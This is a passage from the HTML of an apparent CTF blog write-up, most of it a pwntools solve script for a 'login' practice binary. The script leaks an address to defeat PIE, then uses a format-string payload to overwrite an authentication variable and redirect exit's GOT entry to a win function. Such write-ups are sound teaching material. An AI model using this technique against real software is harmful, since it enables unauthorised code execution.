+</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-20-pwns-2/2022-01-03_13-59.png" alt=""></p>
+<h3 id="solvepy-2">Solve.py<a href="#solvepy-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./login&#34;</span>)
+pty <span style="color:#f92672">=</span> process<span style="color:#f92672">.</span>PTY
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_fmt</span>(payload):
+	p <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path], stdin<span style="color:#f92672">=</span>pty, stdout<span style="color:#f92672">=</span>pty)
+	p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter credentials: &#39;</span>, payload)
+	<span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Verifying...&#39;</span>)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">autofmt = FmtStr(exec_fmt)
+</span><span style="color:#e6db74">offset = autofmt.offset
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+p <span style="color:#f92672">=</span> process([elf<span style="color:#f92672">.</span>path], stdin<span style="color:#f92672">=</span>pty, stdout<span style="color:#f92672">=</span>pty)
+
+leaked_login_addr <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Welcome to &#39;</span>)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; sector!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>), <span style="color:#ae81ff">16</span>)
+abs_login_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;login&#39;</span>]
+elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leaked_login_addr <span style="color:#f92672">-</span> abs_login_addr
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;leaked_login_addr = </span><span style="color:#e6db74">{</span>hex(leaked_login_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;abs_login_addr = </span><span style="color:#e6db74">{</span>hex(abs_login_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;base_address = </span><span style="color:#e6db74">{</span>hex(elf<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+
+authen_code_offset <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;authen_code&#39;</span>]
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;authen_code offset: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> hex(authen_code_offset))
+
+payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">6</span>, {authen_code_offset : <span style="color:#ae81ff">0x1ee71ee7</span>, elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;exit&#39;</span>] : elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;win&#39;</span>]})
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;fmtstr_payload: </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter credentials: &#39;</span>, payload)
+print(p<span style="color:#f92672">.</span>clean())
+</code></pre></div><h2 id="footnotes">Footnotes<a href="#footnotes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>Format string bug exploitation tools.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://legiahuyy.github.io/blog/en/posts/htb-secret/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HackTheBox: Secret</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://legiahuyy.github.io/blog/en/posts/pwns-1/">
+                <span class="button__text">PWN Journey: Part 1</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>© 2022 The Archivist</a>.</span>
+    
+        <span>All posts are licensed under <a href="https://creativecommons.org/licenses/by/4.0/legalcode">CC BY 4.0</a>.</span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://legiahuyy.github.io/blog/en/assets/main.js"></script>
+<script src="https://legiahuyy.github.io/blog/en/assets/prism.js"></script>
+
+
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script>
+const images = Array.from(document.querySelectorAll(".post-content img"));
+images.forEach(img => {
+  mediumZoom(img, {
+    margin: 0,  
+    background: '#222129',
+    scrollOffset: 40,  
+    container: null,  
+    template: null  
+  });
+});
+</script>
+
+
+  
+</div>
+
+</body>
+</html>
